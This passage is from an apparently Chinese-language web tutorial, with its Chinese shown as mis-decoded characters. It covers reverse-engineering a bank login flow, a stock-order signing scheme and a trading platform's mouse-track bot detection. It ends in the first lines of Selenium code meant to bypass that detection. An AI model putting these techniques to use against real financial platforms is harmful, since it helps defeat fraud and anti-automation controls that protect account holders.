<span class="kn">from</span><span class="w"> </span><span class="nn">Crypto.PublicKey</span><span class="w"> </span><span class="kn">import</span> <span class="n">RSA</span>
<span class="kn">from</span><span class="w"> </span><span class="nn">Crypto.Cipher</span><span class="w"> </span><span class="kn">import</span> <span class="n">PKCS1_v1_5</span>
<span class="kn">import</span><span class="w"> </span><span class="nn">base64</span>

<span class="k">class</span><span class="w"> </span><span class="nc">BankLogin</span><span class="p">:</span>
    <span class="k">def</span><span class="w"> </span><span class="fm">__init__</span><span class="p">(</span><span class="bp">self</span><span class="p">):</span>
        <span class="bp">self</span><span class="o">.</span><span class="n">session</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">Session</span><span class="p">()</span>
        <span class="bp">self</span><span class="o">.</span><span class="n">public_key</span> <span class="o">=</span> <span class="kc">None</span>

    <span class="k">def</span><span class="w"> </span><span class="nf">get_public_key</span><span class="p">(</span><span class="bp">self</span><span class="p">):</span>
<span class="w">        </span><span class="sd">&quot;&quot;&quot;è·å– RSA å…¬é’¥&quot;&quot;&quot;</span>
        <span class="n">response</span> <span class="o">=</span> <span class="bp">self</span><span class="o">.</span><span class="n">session</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s1">&#39;https://bank.example.com/api/public-key&#39;</span><span class="p">)</span>
        <span class="bp">self</span><span class="o">.</span><span class="n">public_key</span> <span class="o">=</span> <span class="n">response</span><span class="o">.</span><span class="n">json</span><span class="p">()[</span><span class="s1">&#39;public_key&#39;</span><span class="p">]</span>
        <span class="k">return</span> <span class="bp">self</span><span class="o">.</span><span class="n">public_key</span>

    <span class="k">def</span><span class="w"> </span><span class="nf">encrypt_password</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">password</span><span class="p">):</span>
<span class="w">        </span><span class="sd">&quot;&quot;&quot;RSA åŠ å¯†å¯†ç &quot;&quot;&quot;</span>
        <span class="n">key</span> <span class="o">=</span> <span class="n">RSA</span><span class="o">.</span><span class="n">import_key</span><span class="p">(</span><span class="bp">self</span><span class="o">.</span><span class="n">public_key</span><span class="p">)</span>
        <span class="n">cipher</span> <span class="o">=</span> <span class="n">PKCS1_v1_5</span><span class="o">.</span><span class="n">new</span><span class="p">(</span><span class="n">key</span><span class="p">)</span>
        <span class="n">encrypted</span> <span class="o">=</span> <span class="n">cipher</span><span class="o">.</span><span class="n">encrypt</span><span class="p">(</span><span class="n">password</span><span class="o">.</span><span class="n">encode</span><span class="p">())</span>
        <span class="k">return</span> <span class="n">base64</span><span class="o">.</span><span class="n">b64encode</span><span class="p">(</span><span class="n">encrypted</span><span class="p">)</span><span class="o">.</span><span class="n">decode</span><span class="p">()</span>

    <span class="k">def</span><span class="w"> </span><span class="nf">generate_device_id</span><span class="p">(</span><span class="bp">self</span><span class="p">):</span>
<span class="w">        </span><span class="sd">&quot;&quot;&quot;ç”Ÿæˆè®¾å¤‡æŒ‡çº¹&quot;&quot;&quot;</span>
        <span class="n">fingerprint</span> <span class="o">=</span> <span class="p">{</span>
            <span class="s1">&#39;userAgent&#39;</span><span class="p">:</span> <span class="s1">&#39;Mozilla/5.0...&#39;</span><span class="p">,</span>
            <span class="s1">&#39;language&#39;</span><span class="p">:</span> <span class="s1">&#39;zh-CN&#39;</span><span class="p">,</span>
            <span class="s1">&#39;platform&#39;</span><span class="p">:</span> <span class="s1">&#39;Linux x86_64&#39;</span><span class="p">,</span>
            <span class="s1">&#39;screen&#39;</span><span class="p">:</span> <span class="s1">&#39;1920x1080&#39;</span><span class="p">,</span>
            <span class="s1">&#39;timezone&#39;</span><span class="p">:</span> <span class="o">-</span><span class="mi">480</span>
        <span class="p">}</span>
        <span class="n">fp_str</span> <span class="o">=</span> <span class="nb">str</span><span class="p">(</span><span class="n">fingerprint</span><span class="p">)</span>
        <span class="k">return</span> <span class="n">hashlib</span><span class="o">.</span><span class="n">md5</span><span class="p">(</span><span class="n">fp_str</span><span class="o">.</span><span class="n">encode</span><span class="p">())</span><span class="o">.</span><span class="n">hexdigest</span><span class="p">()</span>

    <span class="k">def</span><span class="w"> </span><span class="nf">generate_sign</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">params</span><span class="p">):</span>
<span class="w">        </span><span class="sd">&quot;&quot;&quot;ç”Ÿæˆç­¾å&quot;&quot;&quot;</span>
        <span class="n">sorted_params</span> <span class="o">=</span> <span class="nb">sorted</span><span class="p">(</span><span class="n">params</span><span class="o">.</span><span class="n">items</span><span class="p">())</span>
        <span class="n">sign_str</span> <span class="o">=</span> <span class="s1">&#39;&amp;&#39;</span><span class="o">.</span><span class="n">join</span><span class="p">([</span><span class="sa">f</span><span class="s2">&quot;</span><span class="si">{</span><span class="n">k</span><span class="si">}</span><span class="s2">=</span><span class="si">{</span><span class="n">v</span><span class="si">}</span><span class="s2">&quot;</span> <span class="k">for</span> <span class="n">k</span><span class="p">,</span> <span class="n">v</span> <span class="ow">in</span> <span class="n">sorted_params</span><span class="p">])</span>
        <span class="n">sign_str</span> <span class="o">+=</span> <span class="s1">&#39;&amp;key=SECRET_KEY_2023&#39;</span>
        <span class="k">return</span> <span class="n">hashlib</span><span class="o">.</span><span class="n">md5</span><span class="p">(</span><span class="n">sign_str</span><span class="o">.</span><span class="n">encode</span><span class="p">())</span><span class="o">.</span><span class="n">hexdigest</span><span class="p">()</span>

    <span class="k">def</span><span class="w"> </span><span class="nf">login</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">username</span><span class="p">,</span> <span class="n">password</span><span class="p">):</span>
<span class="w">        </span><span class="sd">&quot;&quot;&quot;ç™»å½•æµç¨‹&quot;&quot;&quot;</span>
        <span class="c1"># 1. è·å–å…¬é’¥</span>
        <span class="bp">self</span><span class="o">.</span><span class="n">get_public_key</span><span class="p">()</span>

        <span class="c1"># 2. åŠ å¯†å¯†ç </span>
        <span class="n">password_enc</span> <span class="o">=</span> <span class="bp">self</span><span class="o">.</span><span class="n">encrypt_password</span><span class="p">(</span><span class="n">password</span><span class="p">)</span>

        <span class="c1"># 3. å‡†å¤‡å‚æ•°</span>
        <span class="n">timestamp</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">time</span><span class="o">.</span><span class="n">time</span><span class="p">())</span>
        <span class="n">params</span> <span class="o">=</span> <span class="p">{</span>
            <span class="s1">&#39;username&#39;</span><span class="p">:</span> <span class="n">username</span><span class="p">,</span>
            <span class="s1">&#39;password_enc&#39;</span><span class="p">:</span> <span class="n">password_enc</span><span class="p">,</span>
            <span class="s1">&#39;device_id&#39;</span><span class="p">:</span> <span class="bp">self</span><span class="o">.</span><span class="n">generate_device_id</span><span class="p">(),</span>
            <span class="s1">&#39;timestamp&#39;</span><span class="p">:</span> <span class="n">timestamp</span>
        <span class="p">}</span>

        <span class="c1"># 4. ç”Ÿæˆç­¾å</span>
        <span class="n">params</span><span class="p">[</span><span class="s1">&#39;sign&#39;</span><span class="p">]</span> <span class="o">=</span> <span class="bp">self</span><span class="o">.</span><span class="n">generate_sign</span><span class="p">(</span><span class="n">params</span><span class="p">)</span>

        <span class="c1"># 5. å‘é€ç™»å½•è¯·æ±‚</span>
        <span class="n">response</span> <span class="o">=</span> <span class="bp">self</span><span class="o">.</span><span class="n">session</span><span class="o">.</span><span class="n">post</span><span class="p">(</span>
            <span class="s1">&#39;https://bank.example.com/api/login&#39;</span><span class="p">,</span>
            <span class="n">json</span><span class="o">=</span><span class="n">params</span>
        <span class="p">)</span>

        <span class="k">return</span> <span class="n">response</span><span class="o">.</span><span class="n">json</span><span class="p">()</span>

    <span class="k">def</span><span class="w"> </span><span class="nf">verify_sms</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">code</span><span class="p">):</span>
<span class="w">        </span><span class="sd">&quot;&quot;&quot;éªŒè¯çŸ­ä¿¡éªŒè¯ç &quot;&quot;&quot;</span>
        <span class="n">response</span> <span class="o">=</span> <span class="bp">self</span><span class="o">.</span><span class="n">session</span><span class="o">.</span><span class="n">post</span><span class="p">(</span>
            <span class="s1">&#39;https://bank.example.com/api/verify-sms&#39;</span><span class="p">,</span>
            <span class="n">json</span><span class="o">=</span><span class="p">{</span><span class="s1">&#39;code&#39;</span><span class="p">:</span> <span class="n">code</span><span class="p">}</span>
        <span class="p">)</span>
        <span class="k">return</span> <span class="n">response</span><span class="o">.</span><span class="n">json</span><span class="p">()</span>

<span class="c1"># ä½¿ç”¨</span>
<span class="n">bank</span> <span class="o">=</span> <span class="n">BankLogin</span><span class="p">()</span>
<span class="n">result</span> <span class="o">=</span> <span class="n">bank</span><span class="o">.</span><span class="n">login</span><span class="p">(</span><span class="s1">&#39;user123&#39;</span><span class="p">,</span> <span class="s1">&#39;password123&#39;</span><span class="p">)</span>
<span class="nb">print</span><span class="p">(</span><span class="n">result</span><span class="p">)</span>

<span class="c1"># è¾“å…¥çŸ­ä¿¡éªŒè¯ç </span>
<span class="n">sms_code</span> <span class="o">=</span> <span class="nb">input</span><span class="p">(</span><span class="s1">&#39;è¯·è¾“å…¥çŸ­ä¿¡éªŒè¯ç : &#39;</span><span class="p">)</span>
<span class="n">verify_result</span> <span class="o">=</span> <span class="n">bank</span><span class="o">.</span><span class="n">verify_sms</span><span class="p">(</span><span class="n">sms_code</span><span class="p">)</span>
<span class="nb">print</span><span class="p">(</span><span class="s1">&#39;Token:&#39;</span><span class="p">,</span> <span class="n">verify_result</span><span class="p">[</span><span class="s1">&#39;token&#39;</span><span class="p">])</span>
</code></pre>
      </div>

      <hr />

      <h2 id="æ¡ˆä¾‹ä¸‰äº¤æ˜“è®¢å•ç­¾åé˜²ç¯¡æ”¹">æ¡ˆä¾‹ä¸‰ï¼šäº¤æ˜“è®¢å•ç­¾åé˜²ç¯¡æ”¹</h2>

      <h3 id="èƒŒæ™¯-3">èƒŒæ™¯</h3>

      <p>è‚¡ç¥¨äº¤æ˜“ä¸‹å•æ¥å£éœ€è¦å¯¹è®¢å•å‚æ•°è¿›è¡Œç­¾åï¼Œé˜²æ­¢å‚æ•°è¢«ç¯¡æ”¹ï¼š</p>

      <div class="codehilite">
        <pre><span></span><code><span class="nf">POST</span> <span class="nn">/api/trade/order</span> <span class="kr">HTTP</span><span class="o">/</span><span class="m">1.1</span>

{
    &quot;stock_code&quot;: &quot;600000&quot;,
    &quot;action&quot;: &quot;buy&quot;,
    &quot;price&quot;: 13.56,
    &quot;quantity&quot;: 1000,
    &quot;timestamp&quot;: 1702800000,
    &quot;nonce&quot;: &quot;abc123&quot;,
    &quot;signature&quot;: &quot;1a2b3c4d...&quot;
}
</code></pre>
      </div>

      <hr />

      <h3 id="é€†å‘åˆ†æ">é€†å‘åˆ†æ</h3>

      <h4 id="1-å®šä½ç­¾åç”Ÿæˆå‡½æ•°">1. å®šä½ç­¾åç”Ÿæˆå‡½æ•°</h4>

      <p>åœ¨ä¸‹å•æŒ‰é’®ä¸Šè®¾ç½®æ–­ç‚¹ï¼Œè¿½è¸ªè°ƒç”¨æ ˆï¼š</p>

      <div class="codehilite">
        <pre><span></span><code><span class="kd">function</span><span class="w"> </span><span class="nx">generateOrderSignature</span><span class="p">(</span><span class="nx">orderData</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">    </span><span class="c1">// 1. å‚æ•°æ’åº</span>
<span class="w">    </span><span class="kd">const</span><span class="w"> </span><span class="nx">keys</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nb">Object</span><span class="p">.</span><span class="nx">keys</span><span class="p">(</span><span class="nx">orderData</span><span class="p">).</span><span class="nx">sort</span><span class="p">();</span>

<span class="w">    </span><span class="c1">// 2. æ‹¼æ¥å­—ç¬¦ä¸²</span>
<span class="w">    </span><span class="kd">let</span><span class="w"> </span><span class="nx">signStr</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s1">&#39;&#39;</span><span class="p">;</span>
<span class="w">    </span><span class="nx">keys</span><span class="p">.</span><span class="nx">forEach</span><span class="p">(</span><span class="nx">key</span><span class="w"> </span><span class="p">=&gt;</span><span class="w"> </span><span class="p">{</span>
<span class="w">        </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="nx">key</span><span class="w"> </span><span class="o">!==</span><span class="w"> </span><span class="s1">&#39;signature&#39;</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">            </span><span class="nx">signStr</span><span class="w"> </span><span class="o">+=</span><span class="w"> </span><span class="sb">`</span><span class="si">${</span><span class="nx">key</span><span class="si">}</span><span class="sb">=</span><span class="si">${</span><span class="nx">orderData</span><span class="p">[</span><span class="nx">key</span><span class="p">]</span><span class="si">}</span><span class="sb">&amp;`</span><span class="p">;</span>
<span class="w">        </span><span class="p">}</span>
<span class="w">    </span><span class="p">});</span>

<span class="w">    </span><span class="c1">// 3. æ·»åŠ ç§é’¥ï¼ˆä» localStorage è·å–ï¼‰</span>
<span class="w">    </span><span class="kd">const</span><span class="w"> </span><span class="nx">privateKey</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">localStorage</span><span class="p">.</span><span class="nx">getItem</span><span class="p">(</span><span class="s1">&#39;user_private_key&#39;</span><span class="p">);</span>
<span class="w">    </span><span class="nx">signStr</span><span class="w"> </span><span class="o">+=</span><span class="w"> </span><span class="sb">`key=</span><span class="si">${</span><span class="nx">privateKey</span><span class="si">}</span><span class="sb">`</span><span class="p">;</span>

<span class="w">    </span><span class="c1">// 4. SHA256 ç­¾å</span>
<span class="w">    </span><span class="k">return</span><span class="w"> </span><span class="nx">CryptoJS</span><span class="p">.</span><span class="nx">SHA256</span><span class="p">(</span><span class="nx">signStr</span><span class="p">).</span><span class="nx">toString</span><span class="p">();</span>
<span class="p">}</span>
</code></pre>
      </div>

      <h4 id="2-ç§é’¥è·å–">2. ç§é’¥è·å–</h4>

      <p>ç§é’¥åœ¨ç™»å½•æˆåŠŸåå­˜å‚¨ï¼š</p>

      <div class="codehilite">
        <pre><span></span><code><span class="c1">// ç™»å½•å“åº”</span>
<span class="p">{</span>
<span class="w">    </span><span class="s2">&quot;token&quot;</span><span class="o">:</span><span class="w"> </span><span class="s2">&quot;eyJhbGciOiJIUzI1NiIs...&quot;</span><span class="p">,</span>
<span class="w">    </span><span class="s2">&quot;private_key&quot;</span><span class="o">:</span><span class="w"> </span><span class="s2">&quot;sk_live_1234567890abcdef&quot;</span><span class="w">  </span><span class="c1">// ç”¨æˆ·ç§é’¥</span>
<span class="p">}</span>

<span class="c1">// å­˜å‚¨åˆ° localStorage</span>
<span class="nx">localStorage</span><span class="p">.</span><span class="nx">setItem</span><span class="p">(</span><span class="s1">&#39;user_private_key&#39;</span><span class="p">,</span><span class="w"> </span><span class="nx">data</span><span class="p">.</span><span class="nx">private_key</span><span class="p">);</span>
</code></pre>
      </div>

      <h4 id="3-python-å®ç°-2">3. Python å®ç°</h4>

      <div class="codehilite">
        <pre><span></span><code><span class="kn">import</span><span class="w"> </span><span class="nn">hashlib</span>
<span class="kn">import</span><span class="w"> </span><span class="nn">time</span>
<span class="kn">import</span><span class="w"> </span><span class="nn">uuid</span>

<span class="k">def</span><span class="w"> </span><span class="nf">generate_order_signature</span><span class="p">(</span><span class="n">order_data</span><span class="p">,</span> <span class="n">private_key</span><span class="p">):</span>
    <span class="c1"># ç§»é™¤ signature å­—æ®µ</span>
    <span class="n">params</span> <span class="o">=</span> <span class="p">{</span><span class="n">k</span><span class="p">:</span> <span class="n">v</span> <span class="k">for</span> <span class="n">k</span><span class="p">,</span> <span class="n">v</span> <span class="ow">in</span> <span class="n">order_data</span><span class="o">.</span><span class="n">items</span><span class="p">()</span> <span class="k">if</span> <span class="n">k</span> <span class="o">!=</span> <span class="s1">&#39;signature&#39;</span><span class="p">}</span>

    <span class="c1"># å‚æ•°æ’åº</span>
    <span class="n">sorted_params</span> <span class="o">=</span> <span class="nb">sorted</span><span class="p">(</span><span class="n">params</span><span class="o">.</span><span class="n">items</span><span class="p">())</span>

    <span class="c1"># æ‹¼æ¥å­—ç¬¦ä¸²</span>
    <span class="n">sign_str</span> <span class="o">=</span> <span class="s1">&#39;&amp;&#39;</span><span class="o">.</span><span class="n">join</span><span class="p">([</span><span class="sa">f</span><span class="s2">&quot;</span><span class="si">{</span><span class="n">k</span><span class="si">}</span><span class="s2">=</span><span class="si">{</span><span class="n">v</span><span class="si">}</span><span class="s2">&quot;</span> <span class="k">for</span> <span class="n">k</span><span class="p">,</span> <span class="n">v</span> <span class="ow">in</span> <span class="n">sorted_params</span><span class="p">])</span>
    <span class="n">sign_str</span> <span class="o">+=</span> <span class="sa">f</span><span class="s1">&#39;&amp;key=</span><span class="si">{</span><span class="n">private_key</span><span class="si">}</span><span class="s1">&#39;</span>

    <span class="c1"># SHA256</span>
    <span class="k">return</span> <span class="n">hashlib</span><span class="o">.</span><span class="n">sha256</span><span class="p">(</span><span class="n">sign_str</span><span class="o">.</span><span class="n">encode</span><span class="p">())</span><span class="o">.</span><span class="n">hexdigest</span><span class="p">()</span>

<span class="c1"># ä¸‹å•</span>
<span class="n">order_data</span> <span class="o">=</span> <span class="p">{</span>
    <span class="s1">&#39;stock_code&#39;</span><span class="p">:</span> <span class="s1">&#39;600000&#39;</span><span class="p">,</span>
    <span class="s1">&#39;action&#39;</span><span class="p">:</span> <span class="s1">&#39;buy&#39;</span><span class="p">,</span>
    <span class="s1">&#39;price&#39;</span><span class="p">:</span> <span class="mf">13.56</span><span class="p">,</span>
    <span class="s1">&#39;quantity&#39;</span><span class="p">:</span> <span class="mi">1000</span><span class="p">,</span>
    <span class="s1">&#39;timestamp&#39;</span><span class="p">:</span> <span class="nb">int</span><span class="p">(</span><span class="n">time</span><span class="o">.</span><span class="n">time</span><span class="p">()),</span>
    <span class="s1">&#39;nonce&#39;</span><span class="p">:</span> <span class="nb">str</span><span class="p">(</span><span class="n">uuid</span><span class="o">.</span><span class="n">uuid4</span><span class="p">())</span>
<span class="p">}</span>

<span class="c1"># ç”Ÿæˆç­¾å</span>
<span class="n">private_key</span> <span class="o">=</span> <span class="s1">&#39;sk_live_1234567890abcdef&#39;</span>  <span class="c1"># ä»ç™»å½•å“åº”è·å–</span>
<span class="n">order_data</span><span class="p">[</span><span class="s1">&#39;signature&#39;</span><span class="p">]</span> <span class="o">=</span> <span class="n">generate_order_signature</span><span class="p">(</span><span class="n">order_data</span><span class="p">,</span> <span class="n">private_key</span><span class="p">)</span>

<span class="c1"># å‘é€è®¢å•</span>
<span class="n">response</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">post</span><span class="p">(</span>
    <span class="s1">&#39;https://stock.example.com/api/trade/order&#39;</span><span class="p">,</span>
    <span class="n">json</span><span class="o">=</span><span class="n">order_data</span><span class="p">,</span>
    <span class="n">headers</span><span class="o">=</span><span class="p">{</span><span class="s1">&#39;Authorization&#39;</span><span class="p">:</span> <span class="sa">f</span><span class="s1">&#39;Bearer </span><span class="si">{</span><span class="n">token</span><span class="si">}</span><span class="s1">&#39;</span><span class="p">}</span>
<span class="p">)</span>
</code></pre>
      </div>

      <hr />

      <h2 id="æ¡ˆä¾‹å››åè‡ªåŠ¨åŒ–äº¤æ˜“æ£€æµ‹">æ¡ˆä¾‹å››ï¼šåè‡ªåŠ¨åŒ–äº¤æ˜“æ£€æµ‹</h2>

      <h3 id="èƒŒæ™¯-4">èƒŒæ™¯</h3>

      <p>é‡‘èå¹³å°ä¼šæ£€æµ‹è‡ªåŠ¨åŒ–äº¤æ˜“è¡Œä¸ºï¼š</p>

      <ul>
        <li>é¼ æ ‡è½¨è¿¹åˆ†æ</li>
        <li>æ“ä½œæ—¶é—´é—´éš”</li>
        <li>é”®ç›˜è¾“å…¥æ¨¡å¼</li>
        <li>WebGL æŒ‡çº¹</li>
        <li>æµè§ˆå™¨ç‰¹å¾</li>
      </ul>

      <hr />

      <h3 id="æ£€æµ‹æœºåˆ¶åˆ†æ">æ£€æµ‹æœºåˆ¶åˆ†æ</h3>

      <h4 id="1-é¼ æ ‡è½¨è¿¹æ”¶é›†">1. é¼ æ ‡è½¨è¿¹æ”¶é›†</h4>

      <div class="codehilite">
        <pre><span></span><code><span class="c1">// å¹³å°æ”¶é›†é¼ æ ‡ç§»åŠ¨è½¨è¿¹</span>
<span class="kd">let</span><span class="w"> </span><span class="nx">mouseTrack</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">[];</span>
<span class="nb">document</span><span class="p">.</span><span class="nx">addEventListener</span><span class="p">(</span><span class="s1">&#39;mousemove&#39;</span><span class="p">,</span><span class="w"> </span><span class="kd">function</span><span class="p">(</span><span class="nx">e</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">    </span><span class="nx">mouseTrack</span><span class="p">.</span><span class="nx">push</span><span class="p">({</span>
<span class="w">        </span><span class="nx">x</span><span class="o">:</span><span class="w"> </span><span class="nx">e</span><span class="p">.</span><span class="nx">clientX</span><span class="p">,</span>
<span class="w">        </span><span class="nx">y</span><span class="o">:</span><span class="w"> </span><span class="nx">e</span><span class="p">.</span><span class="nx">clientY</span><span class="p">,</span>
<span class="w">        </span><span class="nx">timestamp</span><span class="o">:</span><span class="w"> </span><span class="nb">Date</span><span class="p">.</span><span class="nx">now</span><span class="p">()</span>
<span class="w">    </span><span class="p">});</span>
<span class="p">});</span>

<span class="c1">// æäº¤è®¢å•æ—¶ä¸€èµ·å‘é€</span>
<span class="kd">function</span><span class="w"> </span><span class="nx">submitOrder</span><span class="p">(</span><span class="nx">orderData</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">    </span><span class="kd">const</span><span class="w"> </span><span class="nx">payload</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">{</span>
<span class="w">        </span><span class="p">...</span><span class="nx">orderData</span><span class="p">,</span>
<span class="w">        </span><span class="nx">mouse_track</span><span class="o">:</span><span class="w"> </span><span class="nx">mouseTrack</span><span class="p">,</span>
<span class="w">        </span><span class="nx">behavior_score</span><span class="o">:</span><span class="w"> </span><span class="nx">calculateBehaviorScore</span><span class="p">(</span><span class="nx">mouseTrack</span><span class="p">)</span>
<span class="w">    </span><span class="p">};</span>

<span class="w">    </span><span class="k">return</span><span class="w"> </span><span class="nx">fetch</span><span class="p">(</span><span class="s1">&#39;/api/trade/order&#39;</span><span class="p">,</span><span class="w"> </span><span class="p">{</span>
<span class="w">        </span><span class="nx">method</span><span class="o">:</span><span class="w"> </span><span class="s1">&#39;POST&#39;</span><span class="p">,</span>
<span class="w">        </span><span class="nx">body</span><span class="o">:</span><span class="w"> </span><span class="nb">JSON</span><span class="p">.</span><span class="nx">stringify</span><span class="p">(</span><span class="nx">payload</span><span class="p">)</span>
<span class="w">    </span><span class="p">});</span>
<span class="p">}</span>

<span class="kd">function</span><span class="w"> </span><span class="nx">calculateBehaviorScore</span><span class="p">(</span><span class="nx">track</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">    </span><span class="c1">// åˆ†æé¼ æ ‡è½¨è¿¹æ˜¯å¦è‡ªç„¶</span>
<span class="w">    </span><span class="c1">// çœŸäººï¼šæ›²çº¿ã€æœ‰æŠ–åŠ¨ã€é€Ÿåº¦å˜åŒ–</span>
<span class="w">    </span><span class="c1">// æœºå™¨ï¼šç›´çº¿ã€åŒ€é€Ÿ</span>

<span class="w">    </span><span class="kd">let</span><span class="w"> </span><span class="nx">smoothness</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mf">0</span><span class="p">;</span>
<span class="w">    </span><span class="k">for</span><span class="w"> </span><span class="p">(</span><span class="kd">let</span><span class="w"> </span><span class="nx">i</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mf">1</span><span class="p">;</span><span class="w"> </span><span class="nx">i</span><span class="w"> </span><span class="o">&lt;</span><span class="w"> </span><span class="nx">track</span><span class="p">.</span><span class="nx">length</span><span class="p">;</span><span class="w"> </span><span class="nx">i</span><span class="o">++</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">        </span><span class="kd">const</span><span class="w"> </span><span class="nx">dx</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">track</span><span class="p">[</span><span class="nx">i</span><span class="p">].</span><span class="nx">x</span><span class="w"> </span><span class="o">-</span><span class="w"> </span><span class="nx">track</span><span class="p">[</span><span class="nx">i</span><span class="o">-</span><span class="mf">1</span><span class="p">].</span><span class="nx">x</span><span class="p">;</span>
<span class="w">        </span><span class="kd">const</span><span class="w"> </span><span class="nx">dy</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">track</span><span class="p">[</span><span class="nx">i</span><span class="p">].</span><span class="nx">y</span><span class="w"> </span><span class="o">-</span><span class="w"> </span><span class="nx">track</span><span class="p">[</span><span class="nx">i</span><span class="o">-</span><span class="mf">1</span><span class="p">].</span><span class="nx">y</span><span class="p">;</span>
<span class="w">        </span><span class="kd">const</span><span class="w"> </span><span class="nx">distance</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nb">Math</span><span class="p">.</span><span class="nx">sqrt</span><span class="p">(</span><span class="nx">dx</span><span class="o">*</span><span class="nx">dx</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="nx">dy</span><span class="o">*</span><span class="nx">dy</span><span class="p">);</span>
<span class="w">        </span><span class="kd">const</span><span class="w"> </span><span class="nx">time</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">track</span><span class="p">[</span><span class="nx">i</span><span class="p">].</span><span class="nx">timestamp</span><span class="w"> </span><span class="o">-</span><span class="w"> </span><span class="nx">track</span><span class="p">[</span><span class="nx">i</span><span class="o">-</span><span class="mf">1</span><span class="p">].</span><span class="nx">timestamp</span><span class="p">;</span>
<span class="w">        </span><span class="kd">const</span><span class="w"> </span><span class="nx">speed</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">distance</span><span class="w"> </span><span class="o">/</span><span class="w"> </span><span class="nx">time</span><span class="p">;</span>

<span class="w">        </span><span class="c1">// é€Ÿåº¦å˜åŒ–è¶Šå¤§ï¼Œè¶ŠåƒçœŸäºº</span>
<span class="w">        </span><span class="nx">smoothness</span><span class="w"> </span><span class="o">+=</span><span class="w"> </span><span class="nb">Math</span><span class="p">.</span><span class="nx">abs</span><span class="p">(</span><span class="nx">speed</span><span class="w"> </span><span class="o">-</span><span class="w"> </span><span class="p">(</span><span class="nx">previousSpeed</span><span class="w"> </span><span class="o">||</span><span class="w"> </span><span class="nx">speed</span><span class="p">));</span>
<span class="w">        </span><span class="nx">previousSpeed</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">speed</span><span class="p">;</span>
<span class="w">    </span><span class="p">}</span>

<span class="w">    </span><span class="k">return</span><span class="w"> </span><span class="nx">smoothness</span><span class="w"> </span><span class="o">&gt;</span><span class="w"> </span><span class="mf">100</span><span class="w"> </span><span class="o">?</span><span class="w"> </span><span class="mf">1</span><span class="w"> </span><span class="o">:</span><span class="w"> </span><span class="mf">0</span><span class="p">;</span><span class="w">  </span><span class="c1">// 1=çœŸäººï¼Œ0=å¯ç–‘</span>
<span class="p">}</span>
</code></pre>
      </div>

      <h4 id="2-ç»•è¿‡ç­–ç•¥">2. ç»•è¿‡ç­–ç•¥</h4>

      <p><strong>ä½¿ç”¨ Selenium æ¨¡æ‹ŸçœŸå®è¡Œä¸º</strong>:</p>

      <div class="codehilite">
        <pre><span></span><code><span class="kn">from</span><span class="w"> </span><span class="nn">selenium</span><span class="w"> </span><span class="kn">import</span> <span class="n">webdriver</span>
<span class="kn">from</span><span class="w"> </span><span class="nn">selenium.webdriver.common.action_chains</span><span class="w"> </span><span class="kn">import</span> <span class="n">ActionChains</span>
<span class="kn">import</span><span class="w"> </span><span class="nn">time</span>
<span class="kn">import</span><span class="w"> </span><span class="nn">random</span>
<span class="kn">import</span><span class="w"> </span><span class="nn">numpy</span><span class="w"> </span><span class="k">as</span><span class="w"> </span><span class="nn">np</span>

<span class="k">def</span><span class="w"> </span><span class="nf">generate_bezier_curve</span><span class="p">(</span><span class="n">start</span><span class="p">,</span> <span class="n">end</span><span class="p">,</span> <span class="n">control_points</span><span class="o">=</span><span class="mi">2</span><span class="p">):</span>
<span class="w">    </span><span class="sd">&quot;&quot;&quot;ç”Ÿæˆè´å¡å°”æ›²çº¿è·¯å¾„ï¼ˆæ¨¡æ‹ŸçœŸå®é¼ æ ‡ç§»åŠ¨ï¼‰&quot;&quot;&quot;</span>
    <span class="c1"># éšæœºç”Ÿæˆæ§åˆ¶ç‚¹</span>
    <span class="n">points</span> <span class="o">=</span> <span class="p">[</span><span class="n">start</span><span class="p">]</span>
    <span class="k">for</span> <span class="n">_</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="n">control_points</span><span class="p">):</span>
        <span class="n">points</span><span class="o">.</span><span class="n">append</span><span class="p">((</span>
            <span class="n">random</span><span class="o">.</span><span class="n">randint</span><span class="p">(</span><span class="nb">min</span><span class="p">(</span><span class="n">start</span><span class="p">[</span><span class="mi">0</span><span class="p">],</span> <span class="n">end</span><span class="p">[</span><span class="mi">0</span><span class="p">]),</span> <span class="nb">max</span><span class="p">(</span><span class="n">start</span><span class="p">[</span><span class="mi">0</span><span class="p">],</span> <span class="n">end</span><span class="p">[</span><span class="mi">0</span><span class="p">])),</span>
